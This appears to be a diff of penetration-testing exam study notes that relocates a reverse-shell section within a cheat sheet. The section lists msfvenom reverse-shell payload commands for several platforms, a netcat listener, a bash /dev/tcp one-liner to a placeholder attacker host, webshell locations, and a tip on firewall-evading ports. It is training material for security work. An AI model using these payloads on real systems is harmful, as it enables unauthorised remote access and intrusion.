@@ -108,13 +108,33 @@
 	| 3389 | TCP      | RDP                  | GUI access (if creds found)                              |
 	| 5432 | TCP      | PostgreSQL           | SQLi, privilege escalation                               |
 	| 5900 | TCP      | VNC                  | GUI access, no auth                                      |
-  - File transfer
- 
   - Selecting [exploit](https://www.exploit-db.com/) rules
     - Priority
       - match service + version, unauthenticated exploit, RCE, exploit in python/bash, exploit with shellcode/reversell, exploit available in 'searchsploit'
     - Non-priority
       - DoS, requires authentication, need compilation, PoC without reverse shell, MSF module, written in unfamiliar language like perl/Java
+ 
+## Reverse shell
+- ready webshell (asp, aspx, cfm, jsp, laudanum, perl, php) locate in kali `/usr/share/webshells/`
+  - aspx: cmdasp.aspx
+  - php: simple-backdoor.php (cmd), php-reverse-shell.php (reverse web shell)
+  - netcat: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
+- generate reverse shell payload  
+  **step 1 start an HTTP server for file delivey (if need to download the payload from kali): `python3 -m http.server 80`**  
+  **step 2 start a netcat listener (ensure port match the payload): `nc -lvnp 4444`**  
+  **step 3 generate payload based on target platform**  
+  - windows32: 'msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell32.exe`
+  - windows64: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI>5 LPORT=443 -f exe -o shell64.exe`  
+  - Linux x86: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf`  
+  - Linux x64: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell64.elf`  
+  - ASP web shell/vuln upload: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f asp -o shell.asp`  
+  - PHP web shell/vuln upload: `msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw -o shell.php`  
+  - Bash RCE, command injection: `bash -i >& /dev/tcp/<KALI>/4444 0>&1`
+    
+**Tips:**  
+  - Always match LPORT between payload and nc  
+  - If you’re serving the payload via HTTP (shell.exe, shell.elf, etc.), make sure it's in the same directory where you started python3 -m http.server  
+  - You can also use ports like 443, 53, or 80 as LPORT to bypass firewalls
 
 ## File transfer 
 - Download windows file to Kali
@@ -148,29 +168,7 @@
 
     target open the http://<KALI>
     ```
-	  
-## Reverse shell
-- ready webshell (asp, aspx, cfm, jsp, laudanum, perl, php) locate in kali `/usr/share/webshells/`
-  - aspx: cmdasp.aspx
-  - php: simple-backdoor.php (cmd), php-reverse-shell.php (reverse web shell)
-  - netcat: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
-- generate reverse shell payload  
-  **step 1 start an HTTP server for file delivey (if need to download the payload from kali): `python3 -m http.server 80`**  
-  **step 2 start a netcat listener (ensure port match the payload): `nc -lvnp 4444`**  
-  **step 3 generate payload based on target platform**  
-  - windows32: 'msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o shell32.exe`
-  - windows64: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI>5 LPORT=443 -f exe -o shell64.exe`  
-  - Linux x86: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell.elf`  
-  - Linux x64: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f elf -o shell64.elf`  
-  - ASP web shell/vuln upload: `msfvenom -p windows/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f asp -o shell.asp`  
-  - PHP web shell/vuln upload: `msfvenom -p php/reverse_php LHOST=<KALI> LPORT=4444 -f raw -o shell.php`  
-  - Bash RCE, command injection: `bash -i >& /dev/tcp/<KALI>/4444 0>&1`
     
-**Tips:**  
-  - Always match LPORT between payload and nc  
-  - If you’re serving the payload via HTTP (shell.exe, shell.elf, etc.), make sure it's in the same directory where you started python3 -m http.server  
-  - You can also use ports like 443, 53, or 80 as LPORT to bypass firewalls
-
 ## Methodology 
 
 ## PWK-200 syallabus
